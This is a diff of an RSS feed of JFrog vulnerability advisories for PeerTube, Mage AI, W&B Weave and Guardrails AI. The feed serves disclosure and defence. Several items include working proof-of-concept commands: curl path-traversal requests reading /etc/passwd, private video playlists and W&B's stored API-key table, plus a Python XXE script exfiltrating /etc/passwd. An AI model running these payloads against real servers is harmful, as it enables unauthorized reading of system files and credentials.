+One of PeerTube’s API endpoints is `/static/streaming-playlists/hls/private/:videoUUID/:playlistName.m3u8`. This endpoint is used to fetch a `.m3u8` file of a private video. The code first checks that a valid video token was sent, and then sends the file contents. PeerTube does not sanitize the `playlistName` argument correctly. Instead of sanitizing the `playlistName` argument from `req.param`, [it tries to sanitize an optional playlistName argument from the query string](https://github.com/Chocobozzz/PeerTube/blob/f0f44e1704db1187ed267ced69cec414974275f5/server/core/middlewares/validators/static.ts#L74). An attacker can use the UUID of a public video, and insert `..%2f` in the `playlistName` field to traverse out of the video’s directory and into any other directory in the system and receive any `.m3u8` file. Reading a meaningful file might be difficult since there is a need to know the exact path of the specific `.m3u8` file wanted.
+
+## PoC
+
+This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
+
+1. First, using a browser, log in to the PeerTube instance with any user’s credentials.
+1. Upload a video to the server and make it private. Browse to the new uploaded video, and use the inspection screen to find and copy the video’s playlist UUID and .m3u8 filename. Save this information.
+1. Upload another video and make it public. Use the inspection screen to find and copy the video’s UUID.
+1. In a terminal, run the following commands (replace “public_uuid” with the UUID of the public video, “private_uuid” with the UUID of the private video, and “private_m3u8_file.m3u8” with the .m3u8 filename, all from step #1):
+
+```
+curl --path-as-is http://localhost:3000/static/streaming-playlists/hls/private/public_uuid/..%2fprivate_uuid%2fprivate_m3u8_file.m3u8 -H "x-peertube-video-password: 123"
+```
+The .m3u8 file will be returned.
+
+
 
 ## Vulnerability Mitigations
 
@@ -2926,43 +3075,6 @@ with -
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Mage AI deleted users RCE]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mage-ai-deleted-users-rce-jfsa-2024-001039602/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-deleted-users-rce-jfsa-2024-001039602/</guid>
-            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2024-45187, HIGH, Mage AI deleted users RCE]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Mage AI allows deleted users to use the terminal server with admin access, leading to remote code execution
-
-## Component
-
-mage-ai
-
-## Affected versions
-
-(,)
-
-## Description
-
-Guest users in the Mage AI framework that remain logged in after their accounts are deleted, are mistakenly given high privileges and specifically given access to remotely execute arbitrary code through the Mage AI terminal server
-
-## PoC
-
-No PoC is supplied for this issue
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-No references are supplied for this issue
-
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Mage AI file content request remote arbitrary file leak]]></title>
             <link>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</link>
             <guid>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</guid>
@@ -2991,49 +3103,6 @@ Mage AI allows remote users with the "Viewer" role to leak arbitrary files from 
 curl -X GET
 'http://localhost:6789/api/file_contents/..%2F..%2F..%2Fetc%2Fpasswd?api_key=
 <USER API KEY>' -H 'Authorization: Bearer
-<USER TOKEN>'
-```
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-No references are supplied for this issue
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Mage AI git content request remote arbitrary file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</guid>
-            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2024-45189, MEDIUM, Mage AI git content request remote arbitrary file leak]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Mage AI git content request remote arbitrary file leak
-
-## Component
-
-mage-ai
-
-## Affected versions
-
-(,)
-
-## Description
-
-Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "Git Content" request
-
-## PoC
-
-```bash
-curl -X GET
-'http://localhost:6789/api/git_file/..%2F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
 <USER TOKEN>'
 ```
 
@@ -3094,6 +3163,86 @@ No references are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Mage AI deleted users RCE]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mage-ai-deleted-users-rce-jfsa-2024-001039602/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-deleted-users-rce-jfsa-2024-001039602/</guid>
+            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2024-45187, HIGH, Mage AI deleted users RCE]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Mage AI allows deleted users to use the terminal server with admin access, leading to remote code execution
+
+## Component
+
+mage-ai
+
+## Affected versions
+
+(,)
+
+## Description
+
+Guest users in the Mage AI framework that remain logged in after their accounts are deleted, are mistakenly given high privileges and specifically given access to remotely execute arbitrary code through the Mage AI terminal server
+
+## PoC
+
+No PoC is supplied for this issue
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+No references are supplied for this issue
+
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Mage AI git content request remote arbitrary file leak]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</guid>
+            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2024-45189, MEDIUM, Mage AI git content request remote arbitrary file leak]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Mage AI git content request remote arbitrary file leak
+
+## Component
+
+mage-ai
+
+## Affected versions
+
+(,)
+
+## Description
+
+Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "Git Content" request
+
+## PoC
+
+```bash
+curl -X GET
+'http://localhost:6789/api/git_file/..%2F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
+<USER TOKEN>'
+```
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+No references are supplied for this issue
+
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Mage AI Terminal Server Infoleak]]></title>
             <link>https://research.jfrog.com/vulnerabilities/mage-ai-terminal-server-infoleak-jfsa-2024-001039574/</link>
             <guid>https://research.jfrog.com/vulnerabilities/mage-ai-terminal-server-infoleak-jfsa-2024-001039574/</guid>
@@ -3133,130 +3282,6 @@ No mitigations are supplied for this issue
 ## References
 
 No references are supplied for this issue
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[W&B Weave server remote arbitrary file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/wandb-weave-server-remote-arbitrary-file-leak-jfsa-2024-001039248/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/wandb-weave-server-remote-arbitrary-file-leak-jfsa-2024-001039248/</guid>
-            <pubDate>Wed, 31 Jul 2024 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2024-7340, HIGH, W&B Weave server remote arbitrary file leak]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-W&B Weave server remote arbitrary file leak and privilege escalation
-
-## Component
-
-weave
-
-## Affected versions
-
-(,0.50.7]
-
-## Description
-
-The Weave server API allows remote users to fetch files from a specific directory, but due to a lack of input validation, it is possible to traverse and leak arbitrary files remotely. In various common scenarios, this allows a low-privileged user to assume the role of the server admin.
-
-## PoC
-
-```
-export WANDB=<WANDB SESSION COOKIE>
-export WANDB_SSO=<WANDB SSO SESSION COOKIE>
-export SERVER_IP=<WANDB SERVER IP>
-
-curl -s --path-as-is --cookie "wandb=$WANDB; wandb_sso=$WANDB_SSO" "http://$SERVER_IP:8080/__weave/file/vol/weave/cache/../../../vol/mysql/wandb_local/api_keys.ibd" --output apikeys.bin
-```
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-[Vendor fix](https://github.com/wandb/weave/pull/1657)
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Guardrails RAIL XXE]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/guardrails-rail-xxe-jfsa-2024-001035519/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/guardrails-rail-xxe-jfsa-2024-001035519/</guid>
-            <pubDate>Sun, 21 Jul 2024 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2024-6961, MEDIUM, Guardrails RAIL XXE]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-XXE in Guardrails AI when consuming RAIL documents
-
-## Component
-
-guardrails-ai
-
-## Affected versions
-
-(,0.5.0)
-
-## Description
-
-RAIL documents are an XML-based format invented by Guardrails AI to enforce formatting checks on LLM outputs. Guardrails users that consume RAIL documents from external sources are vulnerable to XXE, which may cause leakage of internal file data via the SYSTEM entity.
-
-
-
-## PoC
-
-```python
-import anthropic
-import guardrails as gd
-from litellm import litellm
-import os 
-
-os.environ["ANTHROPIC_API_KEY"] = "put_here_your_secret_api_key"
-API_KEY = os.environ["ANTHROPIC_API_KEY"]
-
-## Assuming this RAIL document comes from an attacker
-rail_str = """
-<!--?xml version="0.1" ?-->
-<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<rail version="0.1">
-
-<output type="string" >
-</output>
-
-<prompt>
-just write back what appears down here:
-&xxe;
-</prompt>
-</rail>
-"""
-
-## Call the vulnerable API
-guard = gd.Guard.from_rail_string(rail_str)
-
-llm_output_unfiltered, validated_output, *rest = guard(
-  llm_api=litellm.completion,
-  model="claude-3-opus-20240229"
-)
-
-## The validated_output will contain the contents of /etc/passwd
-print(validated_output)
-
-```
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Vendor fix](https://github.com/guardrails-ai/guardrails/pull/922)
 
 ]]></content:encoded>
         </item>
